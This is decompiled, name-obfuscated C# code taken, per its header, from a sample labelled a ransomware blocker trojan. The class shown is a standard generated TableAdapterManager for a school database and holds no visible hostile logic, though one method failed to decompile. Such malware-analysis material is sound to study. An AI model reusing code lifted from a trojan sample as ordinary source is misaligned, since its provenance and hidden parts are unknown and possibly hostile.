// Decompiled with JetBrains decompiler
// Type: Fb45.Xk9q
// Assembly: Kw9, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 454AB7CE-9D73-4F30-B915-379BCB1A28FE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0427c1890b6afe33b5647e2a756353d61092f9e0631bcb8cc3109a25a81f5068.exe

using c3LF;
using Gg6i;
using Microsoft.VisualBasic.CompilerServices;
using Ns24;
using Qn5c;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Diagnostics;
using w1NB;
using z9GL;

namespace Fb45
{
  [DesignerCategory("code")]
  [ToolboxItem(true)]
  [Designer("Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
  [HelpKeyword("vs.data.TableAdapterManager")]
  public class Xk9q : Component
  {
    private Xk9q.i4L2 _updateOrder;
    private Kc9p _assesmentsTableAdapter;
    private Yk6d _feesTableAdapter;
    private j1BA _studentTableAdapter;
    private j5Q2 _teachersTableAdapter;
    private n5T4 _userTableAdapter;
    private bool _backupDataSetBeforeUpdate;
    private IDbConnection _connection;

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    public Xk9q.i4L2 UpdateOrder
    {
      get => this._updateOrder;
      set => this._updateOrder = value;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    [Editor("Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor")]
    public Kc9p AssesmentsTableAdapter
    {
      get => this._assesmentsTableAdapter;
      set => this._assesmentsTableAdapter = value;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    [Editor("Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor")]
    public Yk6d FeesTableAdapter
    {
      get => this._feesTableAdapter;
      set => this._feesTableAdapter = value;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    [Editor("Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor")]
    public j1BA StudentTableAdapter
    {
      get => this._studentTableAdapter;
      set => this._studentTableAdapter = value;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    [Editor("Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor")]
    public j5Q2 TeachersTableAdapter
    {
      get => this._teachersTableAdapter;
      set => this._teachersTableAdapter = value;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    [Editor("Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor")]
    public n5T4 UserTableAdapter
    {
      get => this._userTableAdapter;
      set => this._userTableAdapter = value;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    public bool BackupDataSetBeforeUpdate
    {
      get => this._backupDataSetBeforeUpdate;
      set => this._backupDataSetBeforeUpdate = value;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    [Browsable(false)]
    public IDbConnection Connection
    {
      get
      {
        if (this._connection != null)
          return this._connection;
        if (this._assesmentsTableAdapter != null && this._assesmentsTableAdapter.Connection != null)
          return (IDbConnection) this._assesmentsTableAdapter.Connection;
        if (this._feesTableAdapter != null && this._feesTableAdapter.Connection != null)
          return (IDbConnection) this._feesTableAdapter.Connection;
        if (this._studentTableAdapter != null && this._studentTableAdapter.Connection != null)
          return (IDbConnection) this._studentTableAdapter.Connection;
        if (this._teachersTableAdapter != null && this._teachersTableAdapter.Connection != null)
          return (IDbConnection) this._teachersTableAdapter.Connection;
        return this._userTableAdapter != null && this._userTableAdapter.Connection != null ? (IDbConnection) this._userTableAdapter.Connection : (IDbConnection) null;
      }
      set => this._connection = value;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    [Browsable(false)]
    public int TableAdapterInstanceCount
    {
      get
      {
        int num = 0;
        if (this._assesmentsTableAdapter != null)
          checked { ++num; }
        if (this._feesTableAdapter != null)
          checked { ++num; }
        if (this._studentTableAdapter != null)
          checked { ++num; }
        if (this._teachersTableAdapter != null)
          checked { ++num; }
        if (this._userTableAdapter != null)
          checked { ++num; }
        return num;
      }
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    private int x7J6(k5H3 f9R8, List<DataRow> Bb6k, List<DataRow> x7Z9)
    {
      int num = 0;
      if (this._assesmentsTableAdapter != null)
      {
        DataRow[] dataRowArray = this.j8BC(f9R8.Assesments.Select((string) null, (string) null, DataViewRowState.ModifiedCurrent), x7Z9);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._assesmentsTableAdapter.Jx8g(dataRowArray); }
          Bb6k.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._feesTableAdapter != null)
      {
        DataRow[] dataRowArray = this.j8BC(f9R8.Fees.Select((string) null, (string) null, DataViewRowState.ModifiedCurrent), x7Z9);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._feesTableAdapter.y2C1(dataRowArray); }
          Bb6k.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._studentTableAdapter != null)
      {
        DataRow[] dataRowArray = this.j8BC(f9R8.Student.Select((string) null, (string) null, DataViewRowState.ModifiedCurrent), x7Z9);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._studentTableAdapter.m2S1(dataRowArray); }
          Bb6k.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._teachersTableAdapter != null)
      {
        DataRow[] dataRowArray = this.j8BC(f9R8.Teachers.Select((string) null, (string) null, DataViewRowState.ModifiedCurrent), x7Z9);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._teachersTableAdapter.c4BX(dataRowArray); }
          Bb6k.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._userTableAdapter != null)
      {
        DataRow[] dataRowArray = this.j8BC(f9R8.User.Select((string) null, (string) null, DataViewRowState.ModifiedCurrent), x7Z9);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._userTableAdapter.Tm81(dataRowArray); }
          Bb6k.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      return num;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    private int Dj3a(k5H3 m3F2, List<DataRow> w4Q7)
    {
      int num = 0;
      if (this._assesmentsTableAdapter != null)
      {
        DataRow[] dataRowArray = m3F2.Assesments.Select((string) null, (string) null, DataViewRowState.Added);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._assesmentsTableAdapter.Jx8g(dataRowArray); }
          w4Q7.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._feesTableAdapter != null)
      {
        DataRow[] dataRowArray = m3F2.Fees.Select((string) null, (string) null, DataViewRowState.Added);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._feesTableAdapter.y2C1(dataRowArray); }
          w4Q7.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._studentTableAdapter != null)
      {
        DataRow[] dataRowArray = m3F2.Student.Select((string) null, (string) null, DataViewRowState.Added);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._studentTableAdapter.m2S1(dataRowArray); }
          w4Q7.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._teachersTableAdapter != null)
      {
        DataRow[] dataRowArray = m3F2.Teachers.Select((string) null, (string) null, DataViewRowState.Added);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._teachersTableAdapter.c4BX(dataRowArray); }
          w4Q7.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._userTableAdapter != null)
      {
        DataRow[] dataRowArray = m3F2.User.Select((string) null, (string) null, DataViewRowState.Added);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._userTableAdapter.Tm81(dataRowArray); }
          w4Q7.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      return num;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    private int f8D5(k5H3 i1C0, List<DataRow> Gg54)
    {
      int num = 0;
      if (this._userTableAdapter != null)
      {
        DataRow[] dataRowArray = i1C0.User.Select((string) null, (string) null, DataViewRowState.Deleted);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._userTableAdapter.Tm81(dataRowArray); }
          Gg54.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._teachersTableAdapter != null)
      {
        DataRow[] dataRowArray = i1C0.Teachers.Select((string) null, (string) null, DataViewRowState.Deleted);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._teachersTableAdapter.c4BX(dataRowArray); }
          Gg54.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._studentTableAdapter != null)
      {
        DataRow[] dataRowArray = i1C0.Student.Select((string) null, (string) null, DataViewRowState.Deleted);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._studentTableAdapter.m2S1(dataRowArray); }
          Gg54.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._feesTableAdapter != null)
      {
        DataRow[] dataRowArray = i1C0.Fees.Select((string) null, (string) null, DataViewRowState.Deleted);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._feesTableAdapter.y2C1(dataRowArray); }
          Gg54.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      if (this._assesmentsTableAdapter != null)
      {
        DataRow[] dataRowArray = i1C0.Assesments.Select((string) null, (string) null, DataViewRowState.Deleted);
        if (dataRowArray != null && 0 < dataRowArray.Length)
        {
          checked { num += this._assesmentsTableAdapter.Jx8g(dataRowArray); }
          Gg54.AddRange((IEnumerable<DataRow>) dataRowArray);
        }
      }
      return num;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    private DataRow[] j8BC(DataRow[] Zp8z, List<DataRow> z5X6)
    {
      if (Zp8z == null || Zp8z.Length < 1 || z5X6 == null || z5X6.Count < 1)
        return Zp8z;
      List<DataRow> dataRowList = new List<DataRow>();
      int index = 0;
      while (index < Zp8z.Length)
      {
        DataRow dataRow = Zp8z[index];
        if (!z5X6.Contains(dataRow))
          dataRowList.Add(dataRow);
        checked { ++index; }
      }
      return dataRowList.ToArray();
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    public virtual int y5A7(k5H3 c1P3)
    {
      if (c1P3 == null)
        throw new ArgumentNullException("dataSet");
      if (!c1P3.HasChanges())
        return 0;
      if (this._assesmentsTableAdapter != null && !this.f9M8((IDbConnection) this._assesmentsTableAdapter.Connection))
        throw new ArgumentException("All TableAdapters managed by a TableAdapterManager must use the same connection string.");
      if (this._feesTableAdapter != null && !this.f9M8((IDbConnection) this._feesTableAdapter.Connection))
        throw new ArgumentException("All TableAdapters managed by a TableAdapterManager must use the same connection string.");
      if (this._studentTableAdapter != null && !this.f9M8((IDbConnection) this._studentTableAdapter.Connection))
        throw new ArgumentException("All TableAdapters managed by a TableAdapterManager must use the same connection string.");
      if (this._teachersTableAdapter != null && !this.f9M8((IDbConnection) this._teachersTableAdapter.Connection))
        throw new ArgumentException("All TableAdapters managed by a TableAdapterManager must use the same connection string.");
      if (this._userTableAdapter != null && !this.f9M8((IDbConnection) this._userTableAdapter.Connection))
        throw new ArgumentException("All TableAdapters managed by a TableAdapterManager must use the same connection string.");
      IDbConnection connection = this.Connection;
      if (connection == null)
        throw new ApplicationException("TableAdapterManager contains no connection information. Set each TableAdapterManager TableAdapter property to a valid TableAdapter instance.");
      bool flag = false;
      if ((connection.State & ConnectionState.Broken) == ConnectionState.Broken)
        connection.Close();
      if (connection.State == ConnectionState.Closed)
      {
        connection.Open();
        flag = true;
      }
      IDbTransaction dbTransaction = connection.BeginTransaction();
      if (dbTransaction == null)
        throw new ApplicationException("The transaction cannot begin. The current data connection does not support transactions or the current state is not allowing the transaction to begin.");
      List<DataRow> dataRowList1 = new List<DataRow>();
      List<DataRow> dataRowList2 = new List<DataRow>();
      List<DataAdapter> dataAdapterList = new List<DataAdapter>();
      Dictionary<object, IDbConnection> dictionary = new Dictionary<object, IDbConnection>();
      int num = 0;
      DataSet dataSet = (DataSet) null;
      if (this.BackupDataSetBeforeUpdate)
      {
        dataSet = new DataSet();
        dataSet.Merge((DataSet) c1P3);
      }
      try
      {
        if (this._assesmentsTableAdapter != null)
        {
          dictionary.Add((object) this._assesmentsTableAdapter, (IDbConnection) this._assesmentsTableAdapter.Connection);
          this._assesmentsTableAdapter.Connection = (SqlConnection) connection;
          this._assesmentsTableAdapter.Transaction = (SqlTransaction) dbTransaction;
          if (this._assesmentsTableAdapter.Adapter.AcceptChangesDuringUpdate)
          {
            this._assesmentsTableAdapter.Adapter.AcceptChangesDuringUpdate = false;
            dataAdapterList.Add((DataAdapter) this._assesmentsTableAdapter.Adapter);
          }
        }
        if (this._feesTableAdapter != null)
        {
          dictionary.Add((object) this._feesTableAdapter, (IDbConnection) this._feesTableAdapter.Connection);
          this._feesTableAdapter.Connection = (SqlConnection) connection;
          this._feesTableAdapter.Transaction = (SqlTransaction) dbTransaction;
          if (this._feesTableAdapter.Adapter.AcceptChangesDuringUpdate)
          {
            this._feesTableAdapter.Adapter.AcceptChangesDuringUpdate = false;
            dataAdapterList.Add((DataAdapter) this._feesTableAdapter.Adapter);
          }
        }
        if (this._studentTableAdapter != null)
        {
          dictionary.Add((object) this._studentTableAdapter, (IDbConnection) this._studentTableAdapter.Connection);
          this._studentTableAdapter.Connection = (SqlConnection) connection;
          this._studentTableAdapter.Transaction = (SqlTransaction) dbTransaction;
          if (this._studentTableAdapter.Adapter.AcceptChangesDuringUpdate)
          {
            this._studentTableAdapter.Adapter.AcceptChangesDuringUpdate = false;
            dataAdapterList.Add((DataAdapter) this._studentTableAdapter.Adapter);
          }
        }
        if (this._teachersTableAdapter != null)
        {
          dictionary.Add((object) this._teachersTableAdapter, (IDbConnection) this._teachersTableAdapter.Connection);
          this._teachersTableAdapter.Connection = (SqlConnection) connection;
          this._teachersTableAdapter.Transaction = (SqlTransaction) dbTransaction;
          if (this._teachersTableAdapter.Adapter.AcceptChangesDuringUpdate)
          {
            this._teachersTableAdapter.Adapter.AcceptChangesDuringUpdate = false;
            dataAdapterList.Add((DataAdapter) this._teachersTableAdapter.Adapter);
          }
        }
        if (this._userTableAdapter != null)
        {
          dictionary.Add((object) this._userTableAdapter, (IDbConnection) this._userTableAdapter.Connection);
          this._userTableAdapter.Connection = (SqlConnection) connection;
          this._userTableAdapter.Transaction = (SqlTransaction) dbTransaction;
          if (this._userTableAdapter.Adapter.AcceptChangesDuringUpdate)
          {
            this._userTableAdapter.Adapter.AcceptChangesDuringUpdate = false;
            dataAdapterList.Add((DataAdapter) this._userTableAdapter.Adapter);
          }
        }
        if (this.UpdateOrder == Xk9q.i4L2.UpdateInsertDelete)
        {
          checked { num += this.x7J6(c1P3, dataRowList1, dataRowList2); }
          checked { num += this.Dj3a(c1P3, dataRowList2); }
        }
        else
        {
          checked { num += this.Dj3a(c1P3, dataRowList2); }
          checked { num += this.x7J6(c1P3, dataRowList1, dataRowList2); }
        }
        checked { num += this.f8D5(c1P3, dataRowList1); }
        dbTransaction.Commit();
        if (0 < dataRowList2.Count)
        {
          DataRow[] array = new DataRow[checked (dataRowList2.Count - 1 + 1)];
          dataRowList2.CopyTo(array);
          int index = 0;
          while (index < array.Length)
          {
            array[index].AcceptChanges();
            checked { ++index; }
          }
        }
        if (0 < dataRowList1.Count)
        {
          DataRow[] array = new DataRow[checked (dataRowList1.Count - 1 + 1)];
          dataRowList1.CopyTo(array);
          int index = 0;
          while (index < array.Length)
          {
            array[index].AcceptChanges();
            checked { ++index; }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        dbTransaction.Rollback();
        if (this.BackupDataSetBeforeUpdate)
        {
          Debug.Assert(dataSet != null);
          c1P3.Clear();
          c1P3.Merge(dataSet);
        }
        else if (0 < dataRowList2.Count)
        {
          DataRow[] array = new DataRow[checked (dataRowList2.Count - 1 + 1)];
          dataRowList2.CopyTo(array);
          int index = 0;
          while (index < array.Length)
          {
            DataRow dataRow = array[index];
            dataRow.AcceptChanges();
            dataRow.SetAdded();
            checked { ++index; }
          }
        }
        throw exception;
      }
      finally
      {
        if (flag)
          connection.Close();
        if (this._assesmentsTableAdapter != null)
        {
          this._assesmentsTableAdapter.Connection = (SqlConnection) dictionary[(object) this._assesmentsTableAdapter];
          this._assesmentsTableAdapter.Transaction = (SqlTransaction) null;
        }
        if (this._feesTableAdapter != null)
        {
          this._feesTableAdapter.Connection = (SqlConnection) dictionary[(object) this._feesTableAdapter];
          this._feesTableAdapter.Transaction = (SqlTransaction) null;
        }
        if (this._studentTableAdapter != null)
        {
          this._studentTableAdapter.Connection = (SqlConnection) dictionary[(object) this._studentTableAdapter];
          this._studentTableAdapter.Transaction = (SqlTransaction) null;
        }
        if (this._teachersTableAdapter != null)
        {
          this._teachersTableAdapter.Connection = (SqlConnection) dictionary[(object) this._teachersTableAdapter];
          this._teachersTableAdapter.Transaction = (SqlTransaction) null;
        }
        if (this._userTableAdapter != null)
        {
          this._userTableAdapter.Connection = (SqlConnection) dictionary[(object) this._userTableAdapter];
          this._userTableAdapter.Transaction = (SqlTransaction) null;
        }
        if (0 < dataAdapterList.Count)
        {
          DataAdapter[] array = new DataAdapter[checked (dataAdapterList.Count - 1 + 1)];
          dataAdapterList.CopyTo(array);
          int index = 0;
          while (index < array.Length)
          {
            array[index].AcceptChangesDuringUpdate = true;
            checked { ++index; }
          }
        }
      }
      return num;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    protected virtual void e0PY(DataRow[] r4KH, DataRelation Kx50, bool d6M8) => Array.Sort<DataRow>(r4KH, (IComparer<DataRow>) new Xk9q.k0Y(Kx50, d6M8));

    [DebuggerNonUserCode]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    protected virtual bool f9M8(IDbConnection Yo59) => this._connection != null || this.Connection == null || Yo59 == null || string.Equals(this.Connection.ConnectionString, Yo59.ConnectionString, StringComparison.Ordinal);

    static void Ro29()
    {
      // ISSUE: unable to decompile the method.
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    public enum i4L2
    {
      InsertUpdateDelete,
      UpdateInsertDelete,
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
    private class k0Y : IComparer<DataRow>
    {
      private DataRelation _relation;
      private int _childFirst;

      [DebuggerNonUserCode]
      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
      internal k0Y(DataRelation relation, bool childFirst)
      {
        this._relation = relation;
        if (childFirst)
          this._childFirst = -1;
        else
          this._childFirst = 1;
      }

      [DebuggerNonUserCode]
      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
      private DataRow Lr7(DataRow i8B, ref int x8J)
      {
        Debug.Assert(i8B != null);
        DataRow dataRow = i8B;
        x8J = 0;
        IDictionary<DataRow, DataRow> dictionary = (IDictionary<DataRow, DataRow>) new Dictionary<DataRow, DataRow>();
        dictionary[i8B] = i8B;
        for (DataRow parentRow = i8B.GetParentRow(this._relation, DataRowVersion.Default); parentRow != null && !dictionary.ContainsKey(parentRow); parentRow = parentRow.GetParentRow(this._relation, DataRowVersion.Default))
        {
          checked { ++x8J; }
          dataRow = parentRow;
          dictionary[parentRow] = parentRow;
        }
        if (x8J == 0)
        {
          dictionary.Clear();
          dictionary[i8B] = i8B;
          for (DataRow parentRow = i8B.GetParentRow(this._relation, DataRowVersion.Original); parentRow != null && !dictionary.ContainsKey(parentRow); parentRow = parentRow.GetParentRow(this._relation, DataRowVersion.Original))
          {
            checked { ++x8J; }
            dataRow = parentRow;
            dictionary[parentRow] = parentRow;
          }
        }
        return dataRow;
      }

      [DebuggerNonUserCode]
      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "4.0.0.0")]
      public int z7A(DataRow b2Q, DataRow e5Y)
      {
        if (object.ReferenceEquals((object) b2Q, (object) e5Y))
          return 0;
        if (b2Q == null)
          return -1;
        if (e5Y == null)
          return 1;
        int x8J1 = 0;
        DataRow dataRow1 = this.Lr7(b2Q, ref x8J1);
        int x8J2 = 0;
        DataRow dataRow2 = this.Lr7(e5Y, ref x8J2);
        if (object.ReferenceEquals((object) dataRow1, (object) dataRow2))
          return checked (this._childFirst * x8J1.CompareTo(x8J2));
        Debug.Assert(dataRow1.Table != null && dataRow2.Table != null);
        return dataRow1.Table.Rows.IndexOf(dataRow1) < dataRow2.Table.Rows.IndexOf(dataRow2) ? -1 : 1;
      }
    }
  }
}
